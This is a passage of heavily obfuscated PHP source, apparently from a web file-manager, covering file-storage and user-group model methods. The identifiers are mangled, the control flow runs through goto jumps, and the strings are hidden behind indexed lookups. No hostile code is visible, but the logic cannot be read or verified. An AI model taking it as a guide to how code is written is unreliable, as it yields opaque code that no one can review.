Eš­—õİîÕ: $bæ¤‘¹…â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dù½«ó¹®´ = TEMP_PATH . $bæ¤‘¹…â[1695]; if (!is_dir($dù½«ó¹®´)) { mk_dir($dù½«ó¹®´); } goto aŸã¥£¨¼‡; c×œàÈà«Ì: } public function createFileName($fØñ‡¹â¯‚, $a…à»¯ÑÃ‚ = false, $BÏƒºŠØí = false) { goto a™Í¿ë–å£; a™Í¿ë–å£: $DÖğóÅ¨¦­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c’Ç”À¹› = IO::init($DÖğóÅ¨¦­[8]); $E³ï¢¶º¢ß = $this->makeFilePath($fØñ‡¹â¯‚, $c’Ç”À¹›, $a…à»¯ÑÃ‚, $BÏƒºŠØí); goto D•ÕÃî´Û; D•ÕÃî´Û: $CèØé—Ê©Ü = $c’Ç”À¹›->pathFather($E³ï¢¶º¢ß); static $f’¼ŸĞôµ† = false; $C¸‚‚¦µã” = $DÖğóÅ¨¦­[1697] . md5($CèØé—Ê©Ü); goto F¼…âØŠÌÄ; F¼…âØŠÌÄ: if (!$f’¼ŸĞôµ† && !Cache::get($C¸‚‚¦µã”)) { $f’¼ŸĞôµ† = !0; $C†í·çç«£ = IO::mkdir($CèØé—Ê©Ü); if (!IO::exist($C†í·çç«£ . $DÖğóÅ¨¦­[1698])) { IO::mkfile($C†í·çç«£ . $DÖğóÅ¨¦­[1698]); } Cache::set($C¸‚‚¦µã”, 1, 3600 * 2); } return $E³ï¢¶º¢ß; goto Fõ’‘ÌğÂÑ; Fõ’‘ÌğÂÑ: } public function makeFilePath($D²•ÒÜÜà, $D°¡ó¿š, $DêßŒêøô = false, $fÙÚŠîÉ = false) { goto CİÕœ‘–ç; DÎÅØÔÉùÔ: if (!$D²•ÒÜÜà) { $BçŠ¡Ïå×¥ = $fŒèÔ’·ù‘[1701]; } switch ($BçŠ¡Ïå×¥) { case $fŒèÔ’·ù‘[1702]: $fÉ“¤³¤¾ = $fÉ“¤³¤¾ . $fŒèÔ’·ù‘[104] . $D°¡ó¿š->ext($D²•ÒÜÜà); if ($Dà„„¨‹Ó‘ == $fŒèÔ’·ù‘[1640]) { $fÉ“¤³¤¾ .= $fŒèÔ’·ù‘[1389]; } break; case $fŒèÔ’·ù‘[1703]: goto F «ø†©‘; E½áÎÅÉ¡ì: if (IO::isTypeObject($fÉ“¤³¤¾) && !IO::isUploadServer($fÉ“¤³¤¾)) { $CØëë²âŞ = IO::setContent($fÉ“¤³¤¾, $fŒèÔ’·ù‘[33]); if (!$CØëë²âŞ) { show_json($fŒèÔ’·ù‘[1707], !1); } } CacheLock::unlock($C­Ö«Ó÷ƒ); break; goto Aœ‡ÕãŞĞ¾; F «ø†©‘: $bÊ³é½‚è‘ = Model($fŒèÔ’·ù‘[1084])->get($fŒèÔ’·ù‘[1385]); $Fï–‰¸‹æ‡ = substr(md5($fŒèÔ’·ù‘[1704] . $bÊ³é½‚è‘ . date($fŒèÔ’·ù‘[692])), 0, 8); $CÈœËç¨À‡ = KodIO::defaultDriver(); goto Bƒ‰¦”ÖÈÁ; Bƒ‰¦”ÖÈÁ: $fÓ±ƒ¿“…ğ = $fŒèÔ’·ù‘[1082] . $CÈœËç¨À‡[$fŒèÔ’·ù‘[397]] . $fŒèÔ’·ù‘[405] . date($fŒèÔ’·ù‘[1705]) . $Fï–‰¸‹æ‡ . $fŒèÔ’·ù‘[8]; if ($Dà„„¨‹Ó‘ == $fŒèÔ’·ù‘[1640]) { $D²•ÒÜÜà .= $fŒèÔ’·ù‘[1389]; } $C­Ö«Ó÷ƒ = $fŒèÔ’·ù‘[1706] . $fÓ±ƒ¿“…ğ . $D²•ÒÜÜà; goto A¶»ù®õ–â; A¶»ù®õ–â: CacheLock::lock($C­Ö«Ó÷ƒ); $fÉ“¤³¤¾ = $fÓ±ƒ¿“…ğ . $D²•ÒÜÜà; if (IO::exist($fÓ±ƒ¿“…ğ . $D²•ÒÜÜà)) { $B…ÈìéØ¡Š = substr($D²•ÒÜÜà, 0, strlen($D²•ÒÜÜà) - strlen($Dà„„¨‹Ó‘)); $fÑâÅíÕ˜Ç = $fÙÚŠîÉ ? substr($fÙÚŠîÉ, 0, 5) : ($DêßŒêøô ? substr($DêßŒêøô, 0, 5) : rand_string(5)); $fÉ“¤³¤¾ = $fÓ±ƒ¿“…ğ . $B…ÈìéØ¡Š . $fÑâÅíÕ˜Ç . $fŒèÔ’·ù‘[104] . $Dà„„¨‹Ó‘; } goto E½áÎÅÉ¡ì; Aœ‡ÕãŞĞ¾: case $fŒèÔ’·ù‘[1701]: break; default: break; } return $fÉ“¤³¤¾; goto D‹‰¡İìº; CİÕœ‘–ç: $fŒèÔ’·ù‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BçŠ¡Ïå×¥ = Model($fŒèÔ’·ù‘[1084])->get($fŒèÔ’·ù‘[1699]); $fÓ±ƒ¿“…ğ = KodIO::defaultIO() . date($fŒèÔ’·ù‘[1700]); goto F‰–À«Ÿ‹¤; F‰–À«Ÿ‹¤: $fÉ“¤³¤¾ = $fÓ±ƒ¿“…ğ . rand_string(5) . short_id(100); $D²•ÒÜÜà = str_replace($fŒèÔ’·ù‘[8], $fŒèÔ’·ù‘[80], KodIO::clear($D²•ÒÜÜà)); $Dà„„¨‹Ó‘ = $D°¡ó¿š->ext($D²•ÒÜÜà); goto DÎÅØÔÉùÔ; D‹‰¡İìº: } public function addFileByRemote($dÙÒ‰Ä°î±, $bñÒ±ª±Í‰, $AØ¦Öš¿ = array()) { goto dÍàÒøù–õ; c¢½±Ş¥æÏ: $D…÷Ì¸Öš = IO::hashMd5($dÙÒ‰Ä°î±, $dàË¡‡ÉÍÍ); $c…² Ò„„´ = KodIO::defaultDriver(); $eğ†ì£•” = array($dÆ‰ªÔ»å×[552] => IO::size($dÙÒ‰Ä°î±), $dÆ‰ªÔ»å×[1708] => 1, $dÆ‰ªÔ»å×[416] => $bñÒ±ª±Í‰, $dÆ‰ªÔ»å×[744] => $c…² Ò„„´[$dÆ‰ªÔ»å×[397]], $dÆ‰ªÔ»å×[417] => $dÙÒ‰Ä°î±, $dÆ‰ªÔ»å×[1709] => $AØ¦Öš¿[$dÆ‰ªÔ»å×[180]] ? $AØ¦Öš¿[$dÆ‰ªÔ»å×[180]] : IO::hashSimple($dÙÒ‰Ä°î±), $dÆ‰ªÔ»å×[1710] => $D…÷Ì¸Öš ? $D…÷Ì¸Öš : $dàË¡‡ÉÍÍ); goto dÜĞ‚ŸĞÚ…; dÍàÒøù–õ: $dÆ‰ªÔ»å× =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!IO::exist($dÙÒ‰Ä°î±)) { return !1; } $dàË¡‡ÉÍÍ = $AØ¦Öš¿[$dÆ‰ªÔ»å×[179]] ? $AØ¦Öš¿[$dÆ‰ªÔ»å×[179]] : $dÆ‰ªÔ»å×[33]; goto c¢½±Ş¥æÏ; dÜĞ‚ŸĞÚ…: if ($cçÔÏÑê = $this->addFileCheckExist($eğ†ì£•”[$dÆ‰ªÔ»å×[180]], $eğ†ì£•”[$dÆ‰ªÔ»å×[179]], $eğ†ì£•”[$dÆ‰ªÔ»å×[87]])) { return $cçÔÏÑê; } return $this->addFileData($eğ†ì£•”); goto eÜ¿‘¤×; eÜ¿‘¤×: } private function addFileData($eƒÆÙõÂ˜¥) { $bÚƒ•êØ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$eƒÆÙõÂ˜¥) { return !1; } $eƒÆÙõÂ˜¥[$bÚƒ•êØ[87]] = intval($eƒÆÙõÂ˜¥[$bÚƒ•êØ[87]]); if (!$eƒÆÙõÂ˜¥[$bÚƒ•êØ[87]] && strlen($eƒÆÙõÂ˜¥[$bÚƒ•êØ[180]]) > 32) { $eƒÆÙõÂ˜¥[$bÚƒ•êØ[87]] = intval(substr($eƒÆÙõÂ˜¥[$bÚƒ•êØ[180]], 32)); } $fĞù–Ëº½ = $this->add($eƒÆÙõÂ˜¥); return $this->find($fĞù–Ëº½); } public function addFile($a”½¿äÅ, $c†ƒŸŸôäÒ, $b¯éô‡Ô²™ = false) { goto F×ñˆÀ‚á; Dô¡¼Ñ²†: return $d®‹‡Úõ¬œ; goto F‚¤åÄÆ; f¥›ô÷Šèß: $EŒóÌåÑï = $_SERVER[í¤âËÚ£¶íÊ¢][1711] . $Dø½š½§‹Û; CacheLock::lock($EŒóÌåÑï); if ($CÓÊ‡î–… = $this->addFileCheckExist($dÄŒ­ŞÅ—İ, $Dø½š½§‹Û, $EÙøùİÔÓ)) { CacheLock::unlock($EŒóÌåÑï); return $CÓÊ‡î–…; } goto fŒó¯°ÁÏù; fŒó¯°ÁÏù: $BÅ°ŠÛè¥î = $this->addFileMake($a”½¿äÅ, $EÙøùİÔÓ, $dÄŒ­ŞÅ—İ, $Dø½š½§‹Û, $c†ƒŸŸôäÒ, $b¯éô‡Ô²™); $d®‹‡Úõ¬œ = $this->addFileData($BÅ°ŠÛè¥î); CacheLock::unlock($EŒóÌåÑï); goto Dô¡¼Ñ²†; F×ñˆÀ‚á: $dÄŒ­ŞÅ—İ = IO::hashSimple($a”½¿äÅ); $Dø½š½§‹Û = IO::hashMd5($a”½¿äÅ); $EÙøùİÔÓ = IO::size($a”½¿äÅ); goto f¥›ô÷Šèß; F‚¤åÄÆ: } public function addFileMake($DÅ­…×âŸ, $Bù„·„Œ, $dÖòÚ²…×‰, $eìó ñ­™“, $FÈô‰ˆñÀÏ, $Aù‡áÓ„­Ô) { goto CÏ…ÆÓ±¼; AÆ¹“ªö¡ï: $B¤§„¶‘«Î = get_path_this($a‚ä–ŞÆ„); if ($Aù‡áÓ„­Ô) { $e‚°ÖÆ¶¤Œ = IO::move($DÅ­…×âŸ, $f«Øïìêº, !1, $B¤§„¶‘«Î); } else { $e‚°ÖÆ¶¤Œ = IO::copy($DÅ­…×âŸ, $f«Øïìêº, !1, $B¤§„¶‘«Î); } if (!$e‚°ÖÆ¶¤Œ) { return !1; } goto Aàˆº°‘Í; Aàˆº°‘Í: $Dß‘¥¿ÇÍ÷ = KodIO::defaultDriver(); $a‡‡¾ó§¶Ì = array($Fƒ¥ä¼…‰Å[552] => $Bù„·„Œ, $Fƒ¥ä¼…‰Å[1708] => 1, $Fƒ¥ä¼…‰Å[416] => $FÈô‰ˆñÀÏ, $Fƒ¥ä¼…‰Å[744] => $Dß‘¥¿ÇÍ÷[$Fƒ¥ä¼…‰Å[397]], $Fƒ¥ä¼…‰Å[417] => $a‚ä–ŞÆ„, $Fƒ¥ä¼…‰Å[1709] => $dÖòÚ²…×‰, $Fƒ¥ä¼…‰Å[1710] => $eìó ñ­™“); return $a‡‡¾ó§¶Ì; goto f¶‘ôãªÍ; CÏ…ÆÓ±¼: $Fƒ¥ä¼…‰Å =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a‚ä–ŞÆ„ = $this->createFileName($FÈô‰ˆñÀÏ, $dÖòÚ²…×‰, $eìó ñ­™“); $f«Øïìêº = get_path_father($a‚ä–ŞÆ„); goto AÆ¹“ªö¡ï; f¶‘ôãªÍ: } public function addFileCheckExist($bÄî¥¢äëê, $c²ùŞ¡Ö…¹, $cÕÌè¹ÈÂ) { $aÓ½àÎ‡Š” =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A‚´®¼ğùõ = $this->findByHash($bÄî¥¢äëê, $c²ùŞ¡Ö…¹); if (!$A‚´®¼ğùõ) { return !1; } $f¿ŠÚÕ¢ì³ = array($aÓ½àÎ‡Š”[1708] => intval($A‚´®¼ğùõ[$aÓ½àÎ‡Š”[1712]]) + 1, $aÓ½àÎ‡Š”[552] => $cÕÌè¹ÈÂ); $this->where(array($aÓ½àÎ‡Š”[451] => $A‚´®¼ğùõ[$aÓ½àÎ‡Š”[450]]))->save($f¿ŠÚÕ¢ì³); return $A‚´®¼ğùõ; } public function remove($FçÏõà“•) { $this->linkCountChange($FçÏõà“•, !1); $this->clearEmpty(); return !0; } public function linkAdd($Dù¬ŠĞí·) { $this->linkCountChange($Dù¬ŠĞí·, !0); } public function linkCountChange($fÒ‹ÉêšÁ, $AàÏ›Š°°É) { goto D¦ÑŞåÇÚ; C‚íøöàÛÒ: $A…óÏ¢ˆê = array(); foreach ($fÒ‹ÉêšÁ as $cë§”±°£¦) { $CÂÛÓØÛ•ƒ = $cë§”±°£¦ . $a’Ï»…Ü©Ü[33]; if (!$A…óÏ¢ˆê[$CÂÛÓØÛ•ƒ]) { $A…óÏ¢ˆê[$CÂÛÓØÛ•ƒ] = 0; } $A…óÏ¢ˆê[$CÂÛÓØÛ•ƒ]++; } $Fº£…¶´ê• = array(); goto b®‰šƒœ¬š; b®‰šƒœ¬š: foreach ($A…óÏ¢ˆê as $cë§”±°£¦ => $b“¼š„¹Ê») { $CÂÛÓØÛ•ƒ = $b“¼š„¹Ê» . $a’Ï»…Ü©Ü[33]; if (!$Fº£…¶´ê•[$CÂÛÓØÛ•ƒ]) { $Fº£…¶´ê•[$CÂÛÓØÛ•ƒ] = array(); } $Fº£…¶´ê•[$CÂÛÓØÛ•ƒ][] = $cë§”±°£¦; } foreach ($Fº£…¶´ê• as $b“¼š„¹Ê» => $cù­ğ¼º™) { if (!$cù­ğ¼º™) { continue; } $b“¼š„¹Ê» = $AàÏ›Š°°É ? $b“¼š„¹Ê» : -intval($b“¼š„¹Ê»); $Ağª·‰‚ = array($a’Ï»…Ü©Ü[450] => array($a’Ï»…Ü©Ü[7], $cù­ğ¼º™)); if ($b“¼š„¹Ê» < 0) { $Ağª·‰‚[$a’Ï»…Ü©Ü[1712]] = array($a’Ï»…Ü©Ü[933], abs($b“¼š„¹Ê»)); } $this->where($Ağª·‰‚)->setAdd($a’Ï»…Ü©Ü[1712], $b“¼š„¹Ê»); } goto e‚ï‡ù‚ì¼; D¦ÑŞåÇÚ: $a’Ï»…Ü©Ü =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$fÒ‹ÉêšÁ) { return; } if (!is_array($fÒ‹ÉêšÁ)) { $fÒ‹ÉêšÁ = array($fÒ‹ÉêšÁ); } goto C‚íøöàÛÒ; e‚ï‡ù‚ì¼: } public function findByHash($D³À¬È¼ëí, $DÖÎÓ’µƒ = false) { $F˜º¬ ˜À– =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$D³À¬È¼ëí && !$DÖÎÓ’µƒ) { return !1; } $f¨„å„á¤Š = array($F˜º¬ ˜À–[1709] => $D³À¬È¼ëí); if ($DÖÎÓ’µƒ) { $f¨„å„á¤Š = array($F˜º¬ ˜À–[1710] => $DÖÎÓ’µƒ); } return $this->order($F˜º¬ ˜À–[1713])->where($f¨„å„á¤Š)->find(); } public function clearEmpty($f°±ãì÷‘‘ = 0) { goto fíÌÕ¬„‚ò; fíÌÕ¬„‚ò: $f›¬ÖË¿“í =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÖ­İ©³Š = time() - 3600 * 24 * $f°±ãì÷‘‘; $eª¼¥®À™ = $f›¬ÖË¿“í[1714] . $EÖ­İ©³Š; goto Eòø÷°ÇÏƒ; Eòø÷°ÇÏƒ: $D¯×ùĞğœô = $this->where($eª¼¥®À™)->select(); if (!$D¯×ùĞğœô) { return; } $Eº£©‚òÄ = new Task($f›¬ÖË¿“í[1715], $f›¬ÖË¿“í[33], count($D¯×ùĞğœô)); goto fîåùó¢•è; fîåùó¢•è: foreach ($D¯×ùĞğœô as $fÜåº ¥¯æ) { $Eº£©‚òÄ->update(1); $this->resetFile($fÜåº ¥¯æ); } $Eº£©‚òÄ->end(); goto fãàïî¤Ÿ; fãàïî¤Ÿ: } public function resetFile($A¬ÜÅÊš‹”) { goto Fùì…„İ¾”; Bˆ¹åíóˆª: $e÷ÈƒŠ¼Æ = Model($eÄµˆï‘æ[1716])->where($f¿×”ÄîØÊ)->count(); $fà¹ÇÈóÀ› = intval($C—Ã¯šáì) + intval($e÷ÈƒŠ¼Æ); if ($fà¹ÇÈóÀ› == 0) { IO::remove($A¬ÜÅÊš‹”[$eÄµˆï‘æ[85]]); $this->where($f¿×”ÄîØÊ)->delete(); $this->metaSet($A¬ÜÅÊš‹”[$eÄµˆï‘æ[450]], null, null); return; } goto dŸÈŠ‹”¬‹; Fùì…„İ¾”: $eÄµˆï‘æ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f¿×”ÄîØÊ = array($eÄµˆï‘æ[451] => $A¬ÜÅÊš‹”[$eÄµˆï‘æ[450]]); $C—Ã¯šáì = Model($eÄµˆï‘æ[1164])->where($f¿×”ÄîØÊ)->count(); goto Bˆ¹åíóˆª; dŸÈŠ‹”¬‹: if ($A¬ÜÅÊš‹”[$eÄµˆï‘æ[1712]] != $fà¹ÇÈóÀ›) { $this->where($f¿×”ÄîØÊ)->save(array($eÄµˆï‘æ[1708] => $fà¹ÇÈóÀ›)); } goto D‘åçÏÀ; D‘åçÏÀ: } public function storageInfo($E½ĞäµÚº‚ = false) { goto cÜË¤ˆ¼Ÿ×; fç©¸ÆøèÀ: $F–ÓùñŠì¾ = 1; $a¾ÀËÚØ²‹ = 0; $Eë†¹ö´¥ë = 5000; goto eÇé£¿ÄŸ–; cÜË¤ˆ¼Ÿ×: $FÑÊÄÂè¶» =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CóÇÀŠÃœ” = $this->count() + 0.0; $B¤ëğÆ¼ìÀ = 0; goto fç©¸ÆøèÀ; eÇé£¿ÄŸ–: for ($DÑß‚ èÏ› = 0; $DÑß‚ èÏ› < $CóÇÀŠÃœ”; $DÑß‚ èÏ› = $DÑß‚ èÏ› + $Eë†¹ö´¥ë) { $c‘ÎíœÜ¢ = $this->limit($DÑß‚ èÏ›, $DÑß‚ èÏ› + $Eë†¹ö´¥ë)->select(); foreach ($c‘ÎíœÜ¢ as $Dçˆå‰èãî) { $F–ÓùñŠì¾ += $Dçˆå‰èãî[$FÑÊÄÂè¶»[87]] * $Dçˆå‰èãî[$FÑÊÄÂè¶»[1712]]; $B¤ëğÆ¼ìÀ += $Dçˆå‰èãî[$FÑÊÄÂè¶»[87]] * ($Dçˆå‰èãî[$FÑÊÄÂè¶»[1712]] - 1); $a¾ÀËÚØ²‹ += $Dçˆå‰èãî[$FÑÊÄÂè¶»[1712]]; } } $FÛ•†ø¡† = array($FÑÊÄÂè¶»[1717] => $F–ÓùñŠì¾, $FÑÊÄÂè¶»[1718] => $B¤ëğÆ¼ìÀ, $FÑÊÄÂè¶»[1719] => $B¤ëğÆ¼ìÀ / $F–ÓùñŠì¾, $FÑÊÄÂè¶»[91] => $CóÇÀŠÃœ”, $FÑÊÄÂè¶»[1720] => $a¾ÀËÚØ²‹); return $FÛ•†ø¡†; goto EÕĞ§˜âÄ; EÕĞ§˜âÄ: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\x6d\x65" => "\147\x72\157\165\160\x5f\155\x65\x74\141", "\155\x65\x74\x61\x46\x69\x65\x6c\x64" => "\147\162\x6f\x75\160\111\104"); protected function cacheFunctionAlias($c¯Òã¥ÍÈ×) { $C…£¢Öğ—‚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return array($C…£¢Öğ—‚[1721] => array($c¯Òã¥ÍÈ×[0], $C…£¢Öğ—‚[1722]), $C…£¢Öğ—‚[1723] => array($c¯Òã¥ÍÈ×[0], $C…£¢Öğ—‚[1722])); } protected function getInfo($cÜÌ…œ•‹é) { $açğ…“•à× = $this->getInfoSimple($cÜÌ…œ•‹é); if (!$açğ…“•à×) { return !1; } return $this->_listDataApplyItem($açğ…“•à×); } protected function getInfoSimple($E”‘™Òã²–, $BÚˆï°Ç¿œ = false) { $bö¼ƒË·Ë¬ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($BÚˆï°Ç¿œ) { $BâíÓ£ÙñÒ = array($bö¼ƒË·Ë¬[1650] => intval($E”‘™Òã²–)); $bùÛÖõÍ¿‚ = $this->where($BâíÓ£ÙñÒ)->find(); return is_array($bùÛÖõÍ¿‚) ? $bùÛÖõÍ¿‚ : array(); } return $this->cacheFunctionGet($bö¼ƒË·Ë¬[1724], $E”‘™Òã²–); } protected function groupAdd($CáñƒÅ¨) { goto Aˆ¶”ÊÍá´; eœ‡Ëâî°Ö: if (!empty($CáñƒÅ¨[$cƒÛñŸ„Ô[1650]])) { $e¬ğ™šœŠÄ[$cƒÛñŸ„Ô[1650]] = $CáñƒÅ¨[$cƒÛñŸ„Ô[1650]]; } $DÓ²¿÷÷ß = $this->add($e¬ğ™šœŠÄ); $this->setNamePinyin($DÓ²¿÷÷ß, $e¬ğ™šœŠÄ[$cƒÛñŸ„Ô[28]]); goto e»‡Ñ¬ö×; f÷ÇÇ¦‡¤: if ($AÉèïÃçç[$cƒÛñŸ„Ô[490]]) { $Bİ”»ë×±ğ = $AÉèïÃçç[$cƒÛñŸ„Ô[490]] . $AÉèïÃçç[$cƒÛñŸ„Ô[1650]] . $cƒÛñŸ„Ô[47]; } $e¬ğ™šœŠÄ = array($cƒÛñŸ„Ô[416] => $this->groupNameAuto($CáñƒÅ¨[$cƒÛñŸ„Ô[481]], $CáñƒÅ¨[$cƒÛñŸ„Ô[28]]), $cƒÛñŸ„Ô[398] => $CáñƒÅ¨[$cƒÛñŸ„Ô[481]], $cƒÛñŸ„Ô[557] => $Bİ”»ë×±ğ, $cƒÛñŸ„Ô[1725] => $CáñƒÅ¨[$cƒÛñŸ„Ô[1634]], $cƒÛñŸ„Ô[1726] => 0, $cƒÛñŸ„Ô[1654] => 0); if (isset($CáñƒÅ¨[$cƒÛñŸ„Ô[1673]])) { $e¬ğ™šœŠÄ[$cƒÛñŸ„Ô[1673]] = $CáñƒÅ¨[$cƒÛñŸ„Ô[1673]]; } else { $EÃÃˆ÷—¢³ = $this->max($cƒÛñŸ„Ô[1673]); if (!$EÃÃˆ÷—¢³) { $EÃÃˆ÷—¢³ = 0; } $e¬ğ™šœŠÄ[$cƒÛñŸ„Ô[1673]] = $EÃÃˆ÷—¢³ + 1; } goto eœ‡Ëâî°Ö; Aˆ¶”ÊÍá´: $cƒÛñŸ„Ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$CáñƒÅ¨[$cƒÛñŸ„Ô[481]] && isset($CáñƒÅ¨[$cƒÛñŸ„Ô[1650]]) && $CáñƒÅ¨[$cƒÛñŸ„Ô[1650]] == 1) { if ($AÉèïÃçç = $this->getInfoSimple($CáñƒÅ¨[$cƒÛñŸ„Ô[1650]], !0)) { return $CáñƒÅ¨[$cƒÛñŸ„Ô[1650]]; } } else { $AÉèïÃçç = $this->getInfoSimple($CáñƒÅ¨[$cƒÛñŸ„Ô[481]]); if (!$AÉèïÃçç) { return !1; } } $Bİ”»ë×±ğ = $cƒÛñŸ„Ô[502]; goto f÷ÇÇ¦‡¤; e»‡Ñ¬ö×: if (isset($CáñƒÅ¨[$cƒÛñŸ„Ô[1727]])) { $this->metaSet($DÓ²¿÷÷ß, array($cƒÛñŸ„Ô[1727] => $CáñƒÅ¨[$cƒÛñŸ„Ô[1727]], $cƒÛñŸ„Ô[1728] => $CáñƒÅ¨[$cƒÛñŸ„Ô[1728]])); unset($CáñƒÅ¨[$cƒÛñŸ„Ô[1727]]); unset($CáñƒÅ¨[$cƒÛñŸ„Ô[1728]]); } Model($cƒÛñŸ„Ô[1164])->groupRootAdd($DÓ²¿÷÷ß); return $DÓ²¿÷÷ß; goto D„í³‰äŞ; D„í³‰äŞ: } protected function groupEdit($dè²¨˜‰øÖ, $dÆ‘°†Ì¡å) { goto Eµö¦Üª„ë; FĞ‘æ¨½…›: if (isset($dÆ‘°†Ì¡å[$C­äËÔÙã[28]]) && $dÆ‘°†Ì¡å[$C­äËÔÙã[28]] != $f‡¥ì¥íèÎ[$C­äËÔÙã[28]]) { $this->_clearChildrenCache($f‡¥ì¥íèÎ); } return $this->where(array($C­äËÔÙã[1729] => $dè²¨˜‰øÖ))->save($dÆ‘°†Ì¡å); goto DÂØÎñ¥ĞÌ; EóàÑÇàØ÷: if (!empty($dÆ‘°†Ì¡å[$C­äËÔÙã[481]])) { $A¬ßÅ–Äøî = $this->getInfoSimple($dÆ‘°†Ì¡å[$C­äËÔÙã[481]]); if (!$A¬ßÅ–Äøî) { return !1; } if ($f‡¥ì¥íèÎ[$C­äËÔÙã[1650]] == $A¬ßÅ–Äøî[$C­äËÔÙã[1650]]) { return !1; } if ($dÆ‘°†Ì¡å[$C­äËÔÙã[481]] != $f‡¥ì¥íèÎ[$C­äËÔÙã[481]]) { if ($A¬ßÅ–Äøî[$C­äËÔÙã[490]] !== $f‡¥ì¥íèÎ[$C­äËÔÙã[490]] && strpos($A¬ßÅ–Äøî[$C­äËÔÙã[490]], $f‡¥ì¥íèÎ[$C­äËÔÙã[490]] . $f‡¥ì¥íèÎ[$C­äËÔÙã[1650]] . $C­äËÔÙã[47]) === 0) { return !1; } $dÆ‘°†Ì¡å[$C­äËÔÙã[557]] = $A¬ßÅ–Äøî[$C­äËÔÙã[490]] . $dÆ‘°†Ì¡å[$C­äËÔÙã[481]] . $C­äËÔÙã[47]; $this->_changeChildLevel($f‡¥ì¥íèÎ, $A¬ßÅ–Äøî); } } if (isset($dÆ‘°†Ì¡å[$C­äËÔÙã[28]])) { $this->setNamePinyin($dè²¨˜‰øÖ, $dÆ‘°†Ì¡å[$C­äËÔÙã[28]]); } if (isset($dÆ‘°†Ì¡å[$C­äËÔÙã[1727]])) { $this->metaSet($dè²¨˜‰øÖ, array($C­äËÔÙã[1727] => $dÆ‘°†Ì¡å[$C­äËÔÙã[1727]], $C­äËÔÙã[1728] => $dÆ‘°†Ì¡å[$C­äËÔÙã[1728]])); unset($dÆ‘°†Ì¡å[$C­äËÔÙã[1727]]); unset($dÆ‘°†Ì¡å[$C­äËÔÙã[1728]]); } goto FĞ‘æ¨½…›; Eµö¦Üª„ë: $C­äËÔÙã =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f‡¥ì¥íèÎ = $this->getInfoSimple($dè²¨˜‰øÖ); if (!$f‡¥ì¥íèÎ) { return !1; } goto EóàÑÇàØ÷; DÂØÎñ¥ĞÌ: } private function _clearChildrenCache($EÓÁ¹—âù¬) { $CÅª™Û»Ş… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aª“ß¤äÀ™ = array($CÅª™Û»Ş…[557] => array($CÅª™Û»Ş…[516], $EÓÁ¹—âù¬[$CÅª™Û»Ş…[490]] . $EÓÁ¹—âù¬[$CÅª™Û»Ş…[1650]] . $CÅª™Û»Ş…[517])); $D÷¼Ïæõã® = $this->field($CÅª™Û»Ş…[1650])->where($aª“ß¤äÀ™)->select(); foreach ($D÷¼Ïæõã® as $B‚°¸ÆÌš) { $this->cacheFunctionClear($CÅª™Û»Ş…[1730], $B‚°¸ÆÌš[$CÅª™Û»Ş…[1650]]); $this->cacheFunctionClear($CÅª™Û»Ş…[1724], $B‚°¸ÆÌš[$CÅª™Û»Ş…[1650]]); } } private function _changeChildLevel($b‘Ášò¢£ğ, $aÕ°ñ¯ÄŞ, $d­¨òğ÷©ƒ = false) { goto A¯±êãÙ³; A¯±êãÙ³: $bàñÉÀàÀí =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C‡¿Ü¬Ö ã = $b‘Ášò¢£ğ[$bàñÉÀàÀí[490]] . $b‘Ášò¢£ğ[$bàñÉÀàÀí[1650]] . $bàñÉÀàÀí[47]; $bé×¯«ÍÏà = $aÕ°ñ¯ÄŞ[$bàñÉÀàÀí[490]] . $aÕ°ñ¯ÄŞ[$bàñÉÀàÀí[1650]] . $bàñÉÀàÀí[47] . $b‘Ášò¢£ğ[$bàñÉÀàÀí[1650]] . $bàñÉÀàÀí[47]; goto e˜ÎÆåœ´±; D‹ÒÜ‹µ»¸: $this->_clearChildrenCache($b‘Ášò¢£ğ); $this->where($fœ”²ñÌö—)->data($dŒ²¨†Œ‡Õ)->save(); goto A‹¥Ÿô¢Â¸; e˜ÎÆåœ´±: if ($d­¨òğ÷©ƒ) { $bé×¯«ÍÏà = $aÕ°ñ¯ÄŞ[$bàñÉÀàÀí[490]] . $aÕ°ñ¯ÄŞ[$bàñÉÀàÀí[1650]] . $bàñÉÀàÀí[47]; } $fœ”²ñÌö— = array($bàñÉÀàÀí[557] => array($bàñÉÀàÀí[516], $b‘Ášò¢£ğ[$bàñÉÀàÀí[490]] . $b‘Ášò¢£ğ[$bàñÉÀàÀí[1650]] . $bàñÉÀàÀí[517])); $dŒ²¨†Œ‡Õ = array($bàñÉÀàÀí[557] => array($bàñÉÀàÀí[565], "\x72\145\160\154\141\143\x65\50\x70\x61\x72\x65\x6e\x74\x4c\145\x76\x65\x6c\54\x27{$C‡¿Ü¬Ö ã}\47\x2c\x27{$bé×¯«ÍÏà}\47\x29")); goto D‹ÒÜ‹µ»¸; A‹¥Ÿô¢Â¸: } public function setNamePinyin($A“°Ş–Õùº, $cº°ÍâÁ’ = false) { $FöÍ¤ñ‡´© =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$cº°ÍâÁ’) { $EÓŠ³¯ôŒƒ = $this->getInfoSimple($A“°Ş–Õùº); $cº°ÍâÁ’ = $EÓŠ³¯ôŒƒ[$FöÍ¤ñ‡´©[28]]; } if (!Input::check($cº°ÍâÁ’, $FöÍ¤ñ‡´©[560])) { $this->metaSet($A“°Ş–Õùº, $FöÍ¤ñ‡´©[447], null); $this->metaSet($A“°Ş–Õùº, $FöÍ¤ñ‡´©[446], null); return; } $A¬ñ×Óß = array($FöÍ¤ñ‡´©[447] => str_replace($FöÍ¤ñ‡´©[50], $FöÍ¤ñ‡´©[33], Pinyin::encode($cº°ÍâÁ’)), 